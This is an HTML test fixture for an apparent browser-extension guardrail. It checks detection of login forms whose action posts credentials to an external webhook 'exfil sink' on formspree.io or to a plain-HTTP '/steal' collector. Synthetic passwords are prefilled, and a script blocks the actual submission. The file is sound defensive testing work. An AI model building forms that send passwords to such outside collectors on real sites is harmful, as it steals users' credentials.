@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Guardrail Test - Unexpected Form Destinations</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="page-container">
+    <div class="card" style="border-color: rgba(239, 68, 68, 0.4);">
+      <header class="card-header">
+        <div class="badge" style="background: rgba(239, 68, 68, 0.2); color: #f87171; border-color: rgba(239, 68, 68, 0.4);">
+          Scenario 6: Unexpected Form Destinations
+        </div>
+        <h1 id="page-title">Unexpected Form Destination Verification</h1>
+        <p class="description">
+          Synthetic test cases verifying detection when forms target external exfiltration endpoints, insecure HTTP destinations, or pseudo-protocols.
+        </p>
+      </header>
+
+      <section class="test-section">
+        <div id="destination-status" style="padding: 12px; margin-bottom: 16px; border-radius: 8px; background: rgba(148, 163, 184, 0.1); border: 1px solid #475569; font-size: 13px;">
+          Ready to submit. Notice Guardrail detects unexpected destination patterns without accessing sensitive password values.
+        </div>
+
+        <!-- 1. Third-Party Exfiltration Form (Webhook / Formspree) -->
+        <div style="margin-bottom: 20px; padding: 14px; background: rgba(255, 255, 255, 0.03); border: 1px solid #334155; border-radius: 8px;">
+          <h3 style="font-size: 14px; color: #f1f5f9; margin-bottom: 6px;">1. External Webhook Exfiltration Destination</h3>
+          <p style="font-size: 12px; color: #94a3b8; margin-bottom: 10px;">
+            Target action: <code>https://formspree.io/f/test-exfil-sink</code> with password field.
+          </p>
+          <form id="form-exfil-webhook" action="https://formspree.io/f/test-exfil-sink" method="POST" data-guardrail-test-action="test-exfil-form">
+            <div class="field-group" style="margin-bottom: 10px;">
+              <label for="exfil-email" class="field-label">User Email</label>
+              <input type="email" id="exfil-email" name="email" class="input-control" placeholder="user@target.example" value="victim@target.example">
+            </div>
+            <div class="field-group" style="margin-bottom: 12px;">
+              <label for="exfil-pwd" class="field-label">Account Password</label>
+              <input type="password" id="exfil-pwd" name="password" class="input-control" placeholder="Sensitive Account Password" value="syn_pwd_SuperSecretPassword!#99">
+            </div>
+            <button id="btn-submit-exfil" type="submit" class="btn btn-primary" style="background: #ef4444; border-color: #dc2626;">
+              Submit to Exfiltration Sink (Controlled)
+            </button>
+          </form>
+        </div>
+
+        <!-- 2. Insecure Plain HTTP Destination -->
+        <div style="margin-bottom: 20px; padding: 14px; background: rgba(255, 255, 255, 0.03); border: 1px solid #334155; border-radius: 8px;">
+          <h3 style="font-size: 14px; color: #f1f5f9; margin-bottom: 6px;">2. Insecure Plain HTTP Destination</h3>
+          <p style="font-size: 12px; color: #94a3b8; margin-bottom: 10px;">
+            Target action: <code>http://untrusted-collector.local/steal</code> with credentials.
+          </p>
+          <form id="form-insecure-http" action="http://untrusted-collector.local/steal" method="POST" data-guardrail-test-action="test-insecure-http-form">
+            <div class="field-group" style="margin-bottom: 10px;">
+              <label for="http-pass" class="field-label">Credential</label>
+              <input type="password" id="http-pass" name="cred" class="input-control" placeholder="Password" value="syn_pwd_InsecureTest99">
+            </div>
+            <button id="btn-submit-insecure-http" type="submit" class="btn btn-primary" style="background: #f59e0b; border-color: #d97706;">
+              Submit over Insecure HTTP (Controlled)
+            </button>
+          </form>
+        </div>
+
+        <div style="margin-top: 16px; font-size: 13px;">
+          <a href="index.html" class="test-link">&larr; Back to Main Test Page</a>
+        </div>
+      </section>
+
+      <div id="event-log" class="event-log">
+        <div class="log-placeholder">Page activity will be logged here...</div>
+      </div>
+    </div>
+  </main>
+
+  <script src="../../extension/dist/content.js"></script>
+  <script src="script.js"></script>
+  <script>
+    (function() {
+      const forms = document.querySelectorAll('form[data-guardrail-test-action]');
+      forms.forEach(form => {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          const status = document.getElementById('destination-status');
+          if (status) {
+            status.textContent = 'Controlled test form submit intercepted: ' + (form.getAttribute('action') || '');
+          }
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
